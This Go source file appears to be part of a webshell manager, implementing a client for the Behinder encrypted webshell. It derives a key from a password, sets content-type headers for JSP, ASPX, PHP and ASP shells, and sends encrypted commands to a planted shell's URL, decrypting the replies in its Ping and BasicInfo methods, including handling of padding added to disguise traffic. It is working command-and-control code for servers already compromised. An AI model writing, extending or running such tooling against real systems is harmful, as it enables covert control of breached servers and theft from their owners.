package wsm

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/Go0p/wsm/lib/dynamic"
	"github.com/Go0p/wsm/lib/httpx"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/behinder"
	"github.com/Go0p/wsm/lib/utils"
)

type BehinderInfo struct {
	BaseShell
	secretKey   []byte
	encryptMode int
	// response 开头的干扰字符
	prefixLen int
	// response 结尾的干扰字符
	suffixLen int
}

func NewBehinder(b BehinderInfo) *BehinderInfo {
	b.secretKey = utils.SecretKey(b.Password)
	if b.Headers == nil {
		b.Headers = make(map[string]string, 2)
	}
	b.Headers = b.setHeaders()
	b.Client = httpx.NewClient(b.Proxy, b.Headers, b.Script, "")
	return &b
}

func (b *BehinderInfo) setHeaders() map[string]string {
	h := b.Headers
	switch b.Script {
	case shell.JavaScript:
		h["Content-type"] = "application/x-www-form-urlencoded"
	case shell.CsharpScript:
		// 也可以不加
		h["Content-type"] = "application/octet-stream"
	case shell.PhpScript:
		h["Content-type"] = "application/x-www-form-urlencoded"
	case shell.AspScript:
		h["Content-type"] = "application/x-www-form-urlencoded"
	default:
		panic("shell script type error [jsp/jspx/asp/aspx/php]")
	}
	return h
}

// processParams 不同的方法需要传递不同的参数
func (b *BehinderInfo) processParams(p map[string]string) {
	if b.Script != shell.JavaScript {
		delete(p, "forcePrint")
		delete(p, "notEncrypt")
	}
}

func (b *BehinderInfo) Ping(p ...shell.IParams) bool {
	var params map[string]string
	var err error
	if len(p) == 0 {
		np := &behinder.PingParams{}
		np.Check()
		params, err = utils.ToMapParams(np)
	} else {
		p[0].Check()
		params, err = utils.ToMapParams(p[0])
	}
	if err != nil {
		fmt.Println(err)
		return false
	}
	b.processParams(params)
	data := behinder.GetData(b.secretKey, "EchoGo", params, b.Script, b.encryptMode)
	resp, err := b.Client.DoHttpRequest(b.Url, data)
	if err != nil {
		fmt.Println(err)
		panic("EvalFunc1 error")
	}
	wantResultTxt := fmt.Sprintf(`{"msg":"%s","status":"c3VjY2Vzcw=="}`, base64.StdEncoding.EncodeToString([]byte(params["content"])))
	wantResultTxt2 := fmt.Sprintf(`{"status":"c3VjY2Vzcw==","msg":"%s"}`, base64.StdEncoding.EncodeToString([]byte(params["content"])))
	//var enWantResult []byte
	var enWantResult, enWantResult2 []byte
	if params["notEncrypt"] == "true" {
		enWantResult = []byte(wantResultTxt)
		enWantResult2 = []byte(wantResultTxt2)
	} else {
		enWantResult = behinder.Encrypto([]byte(wantResultTxt), b.secretKey, b.encryptMode, b.Script)
		enWantResult2 = behinder.Encrypto([]byte(wantResultTxt2), b.secretKey, b.encryptMode, b.Script)
	}
	rawBody := resp.RawBody
	b.prefixLen, b.suffixLen = dynamic.GetPrefixLenAndSuffixLen(rawBody, enWantResult, enWantResult2)
	resultTxt := behinder.Decrypto(rawBody, b.secretKey, b.Script, params["notEncrypt"], b.encryptMode, b.prefixLen, b.suffixLen)
	result := make(map[string]string, 2)
	if err := json.Unmarshal(resultTxt, &result); err == nil {
		for k, v := range result {
			value, err := base64.StdEncoding.DecodeString(v)
			if err == nil {
				result[k] = string(value)
			}
		}
	}
	if result["status"] == "success" {
		return true
	}
	return false
}

// BasicInfo 不传参数就使用默认参数值
func (b *BehinderInfo) BasicInfo(p ...shell.IParams) shell.IResult {
	var params map[string]string
	var err error
	if len(p) == 0 {
		np := &behinder.BasicInfoParams{}
		np.Check()
		params, err = utils.ToMapParams(np)
	} else {
		p[0].Check()
		params, err = utils.ToMapParams(p[0])
	}
	if err != nil {
		fmt.Println(err)
		return nil
	}
	b.processParams(params)
	data := behinder.GetData(b.secretKey, "BasicInfoGo", params, b.Script, b.encryptMode)
	resp, err := b.Client.DoHttpRequest(b.Url, data)
	if err != nil {
		panic("EvalFunc1 error")
	}

	resData := behinder.Decrypto(resp.RawBody, b.secretKey, b.Script, params["notEncrypt"], b.encryptMode, b.prefixLen, b.suffixLen)

	result := NewResult(resData)
	result.Parser()
	return result
}
